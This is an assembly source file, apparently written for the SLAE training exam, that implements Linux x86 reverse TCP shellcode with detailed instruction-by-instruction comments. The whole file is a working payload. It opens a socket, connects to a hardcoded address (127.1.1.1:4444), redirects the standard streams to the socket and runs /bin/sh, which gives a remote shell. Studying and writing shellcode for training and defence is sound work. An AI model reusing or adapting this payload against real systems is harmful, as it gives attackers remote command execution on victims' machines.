; Filename: shell_reverse_tcp.nasm
; Author: Ray Doyle
; Website: https://www.doyler.net
;
; Purpose: SLAE Exam Assignment #2 - Shell Reverse TCP Shellcode (Linux/x86)

global _start

section .text
_start:
    ; http://man7.org/linux/man-pages/man2/socket.2.html

    ; Move 102 (sys_socketcall) into EAX
    ; Push/Pop saves 1 byte over xor/mov
    push 0x66
    pop eax

    ; Move 1 (SYS_SOCKET) into EBX
    ; Push/Pop saves 1 byte over xor/mov
    push 0x1
    pop ebx

    ; int sock = socket(AF_INET, SOCK_STREAM, 0);

    ; Push the variables for the socket() call onto the stack in reverse order
    ; Push 0 onto the stack (IP - 3rd argument)
    xor esi, esi
    push esi

    ; Push 1 onto the stack (SOCK_STREAM - 2nd argument)
    ; EBX already contains 0x1, saving 1 byte over a push
    push ebx

    ; Push 2 onto the stack (AF_INET - 1st argument)
    push 0x2

    ; Move the stack pointer into ECX, to point to the arguments for socket()
    mov ecx, esp

    ; Execute the socket() call
    int 0x80

    ; Move the returned file descriptor from EAX to EDI for later usage
    ; Pop/Xchg moves EAX into EDI as well as popping the 2 (former AF_INET) into EAX for the SYS_CONNECT argument (same number of bytes)
    pop edi
    xchg eax, edi

connect:
    ; http://man7.org/linux/man-pages/man2/connect.2.html

    ; Move 102 (sys_socketcall) into EAX
    ; EAX was cleared by the previous xchg, saving 2 bytes over xor
    ; Moving this into bl, to swap with EAX
    mov bl, 0x66

    ; Move 3 (SYS_CONNECT) into EBX
    ; EAX already contains 0x2 and EBX contains 0x66, the xchg puts them in the correct register (saving 2 bytes over xor/mov)
    xchg eax, ebx
    ; Will utilize the 0x2 in EBX before incrementing it...see below
    ;inc ebx

    ; struct sockaddr_in address;
    ; address.sin_family = AF_INET;
    ; address.sin_addr.s_addr = "127.0.0.1";
    ; address.sin_port = htons(PORT);

    ; Creating the sockaddr_in structure
    ; Push 127.1.1.1 onto the stack (127.0.0.1 would contain NULL bytes)
    ; https://stackoverflow.com/questions/11860068/basic-shellcode-for-connect-function
    push 0x0101017f

    ; Push 4444 (PORT) onto the stack
    push word 0x5c11  ; Port number in network byte (big endian) order = 4444

    ; Push 2 (AF_INET) onto the stack
    ; EBX already contains 0x2, saving 1 byte over pushw 0x2
    push word bx
    ; Increment from earlier to get 0x3 into EBX for SYS_CONNECT
    inc ebx

    ; Move the stack pointer into ECX, to point to the sockaddr_in struct
    mov ecx, esp

    ; connect(sock, (struct sockaddr *)&address, sizeof(address));
    
    ; Push 16 (the length of the address struct) onto the stack - 3rd argument
    push 0x10

    ; Push ECX (the pointer to the address structure) onto the stack - 2nd argument
    push ecx

    ; Push EDI (the saved file descriptor for the socket) onto the stack - 1st argument
    push edi

    ; Move the stack pointer into ECX, to point to the arguments for connect()
    mov ecx, esp

    ; Execute the connect() call
    int 0x80

    ; Move the saved file descriptor from EDI to EBX for dup() calls
    xchg ebx, edi
    
dup:
    ; http://man7.org/linux/man-pages/man2/dup2.2.html
    
    ; Load 0x2 into ECX as a loop counter, this will be used to loop through STDERR(2), STDOUT(1), and STDIN(0)
    ;xor ecx, ecx
    ;mov cl, 0x2
    ; Push/pop saves one byte over xor/mov
    push 0x2
    pop ecx

dup_loop:
    mov al, 0x3f
    int 0x80
    dec ecx
    jns dup_loop

execve:
    ; http://man7.org/linux/man-pages/man2/execve.2.html

    ; Push the first null dword (terminate the filename) 
    ; ESI is already empty, push it onto the stack as the null terminator
    push esi

    ; Move 11 (sys_execve) into EAX
    mov al, 0xb

    ; execve("/bin/sh", NULL, NULL);

    ; Push //bin/sh (8 bytes) onto the stack
    push 0x68732f2f
    push 0x6e69622f

    ; Move the stack pointer into EBX, to point to the filename
    mov ebx, esp

    ; Move 0 (argv) into ECX
    ; ECX contains 0xffffffff after the dup loop, so increment saves 1 byte over xor
    inc ecx

    ; Move 0 (envp) into EDX
    xor edx, edx

    ; Execute the execve() call
    int 0x80